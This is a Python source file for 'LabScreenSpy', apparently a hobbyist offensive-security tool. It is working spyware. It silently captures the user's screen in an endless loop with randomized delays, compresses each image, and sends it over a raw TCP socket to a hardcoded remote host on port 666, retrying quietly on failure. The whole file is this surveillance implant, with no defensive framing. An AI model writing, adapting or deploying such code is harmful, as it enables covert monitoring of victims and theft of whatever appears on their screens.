
"""
LabScreenSpy - Versão 1.0.0

Autor: Ernani S. Camilo
Nickname: v0id3SC0133
"""
import socket
from PIL import Image
from zlib import compress
from platform import system
import time
import random
import hashlib

if system() == "Windows":
    from PIL import ImageGrab, Image
else:
    import pyscreenshot as ImageGrab
    from PIL import Image

ip = '192.168.1.62'
port = 666

class SpyOffSec():
    def __init__(self, ip, port, img_name='temp.jpg'):
        self.ip = ip
        self.port = int(port)
        self.img_name = img_name

    def screen_recorder(self):
        image = ImageGrab.grab(bbox=(0, 0, 1360, 768))
        resize = image.resize((600, 400), Image.ANTIALIAS)
        resize.save(self.img_name, 'JPEG', quality=40, optimize=False, progressive=False)
        resize.close()

    def image_to_string(self):
        self.screen_recorder()
        with open(self.img_name, 'rb') as handle:
            return handle.read()

    def compress_image(self):
        string = self.image_to_string()
        compressed = compress(compress(compress(compress(string, 9), 9), 9), 9)
        return compressed

    def run(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((self.ip, self.port))

            compressed = self.compress_image()
            length_msg = f"LEN:{len(compressed)}"
            s.send(length_msg.encode())

            resp = s.recv(1024).decode()
            if resp == "OK":
                s.sendall(compressed)
            else:
                s.sendall(b"FAIL")
            s.close()
            return True
        except Exception as e:
            return False

app = SpyOffSec(ip, port)
last_hash = None

while True:
    compressed_img = app.compress_image()
    current_hash = hashlib.md5(compressed_img).hexdigest()
    if current_hash != last_hash:
        success = app.run()
        if success:
            last_hash = current_hash
    time.sleep(random.randint(30, 180))
